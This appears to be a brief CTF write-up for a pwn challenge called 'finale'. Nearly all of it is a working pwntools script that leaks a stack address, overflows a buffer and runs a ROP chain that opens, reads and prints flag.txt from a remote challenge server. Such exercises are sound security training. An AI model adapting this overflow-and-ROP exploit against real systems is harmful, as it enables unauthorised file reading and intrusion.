This was unpleasant. Could not find a rop to set rdx.
Had to compromise by jumping to right before a previous read which set rdx to 0x54, and hope my `pop rbp` lead to someplace in the ret sled.

```python
from pwn import *

context.arch = "amd64"
gdbscript = """

set pagination off
set breakpoint pending on

b *0x401476
b *finale+138
c
"""

password = b"s34s0nf1n4l3b00"
flag = b"flag.txt"

input_addr = 0x7ffdd3ad92e0
ret_addr = 0x7ffdd3ad9328

buffer_size = ret_addr - input_addr
buffer = flag + (b"\x00" * (buffer_size - len(flag)))

with remote("138.68.180.38", 32512, level="Debug") as p:
#with gdb.debug("/home/kali/Downloads/pwn_finale/challenge/finale", gdbscript=gdbscript, level="Debug") as p:

	p.sendline(password)
	info(p.recvuntil(b"good luck: ["))

	stack_leak = int(p.recv(14), 16)
	print("Stack leak:", stack_leak)

	payload = buffer

	payload += p64(0x4012d8) # pop rsi ; ret
	payload += p64(0x0)
	payload += p64(0x4012d6) # pop rdi ; ret
	payload += p64(stack_leak)
	payload += p64(0x4011c0) # open@plt

	payload += p64(0x4012bd) # pop rbp ; ret
	payload += p64(stack_leak + (0x8 * 0x1a))

	payload += p64(0x401476) # finale+111
	payload += p64(0x40101a) # ret
	payload += p64(0x40101a) # ret
	payload += p64(0x40101a) # ret
	payload += p64(0x40101a) # ret
	payload += p64(0x40101a) # ret
	payload += p64(0x40101a) # ret
	payload += p64(0x40101a) # ret
	payload += p64(0x40101a) # ret
	payload += p64(0x40101a) # ret
	payload += p64(0x40101a) # ret
	payload += p64(0x40101a) # ret
	payload += p64(0x40101a) # ret
	payload += p64(0x40101a) # ret
	payload += p64(0x40101a) # ret
	payload += p64(0x40101a) # ret

	payload += p64(0x4012d8) # pop rsi ; ret
	payload += p64(stack_leak)
	payload += p64(0x4012d6) # pop rdi ; ret
	payload += p64(0x3)
	payload += p64(0x401170) # read@plt

	payload += p64(0x4012d8) # pop rsi ; ret
	payload += p64(stack_leak)
	payload += p64(0x4012d6) # pop rdi ; ret
	payload += p64(0x1)
	payload += p64(0x401130) # write@plt

	p.send(payload)

	info(p.recvrepeat(1))
```